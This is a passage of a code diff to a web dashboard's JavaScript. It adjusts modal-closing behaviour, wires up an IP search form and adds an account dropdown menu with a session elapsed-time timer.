     btnClose?.addEventListener('click', closeModal);
-    backdrop?.addEventListener('click', closeModal);
+    backdrop?.addEventListener('mousedown', (e) => {
+      if (e.target === backdrop) closeModal();
+    });
     document.addEventListener('keydown', (e) => {
-      if (e.key === 'Escape' && modal && !modal.hidden) closeModal();
+      if (e.key === 'Escape' && backdrop && backdrop.classList.contains('open')) closeModal();
+    });
+
+    $('#fed-search-form')?.addEventListener('submit', (e) => {
+      e.preventDefault();
+      performIpSearch();
     });
 
     $('#btn-fed-seed-demo')?.addEventListener('click', async () => {
@@ -1582,7 +2480,53 @@
     });
   }
 
+  // Topbar Three-dots Kebab Account Menu Controller
+  function initAccountDropdown() {
+    const kebab = document.getElementById('kebab');
+    const menu = document.getElementById('menu');
+    if (!menu) return;
+
+    function setOpen(o) {
+      menu.classList.toggle('open', o);
+      if (kebab) kebab.setAttribute('aria-expanded', String(o));
+    }
+
+    if (kebab) {
+      kebab.addEventListener('click', (e) => {
+        e.stopPropagation();
+        setOpen(!menu.classList.contains('open'));
+      });
+    }
+
+    menu.addEventListener('click', (e) => e.stopPropagation());
+
+    document.addEventListener('click', () => setOpen(false));
+
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape') {
+        setOpen(false);
+        if (kebab) kebab.focus();
+      }
+    });
+
+    // Session info & live elapsed timer
+    const start = Date.now();
+    const pad = (n) => String(n).padStart(2, '0');
+    const signedEl = document.getElementById('signed');
+    if (signedEl) {
+      signedEl.textContent = new Date(start).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+    }
+    const timerEl = document.getElementById('timer');
+    if (timerEl) {
+      window.setInterval(() => {
+        const s = Math.floor((Date.now() - start) / 1000);
+        timerEl.textContent = pad(Math.floor(s / 3600)) + ':' + pad(Math.floor(s / 60) % 60) + ':' + pad(s % 60);
+      }, 1000);
+    }
+  }
+
   // Start initialization
+  initAccountDropdown();
   initReplayModal();
   initFederationModal();
   loadInitialData();
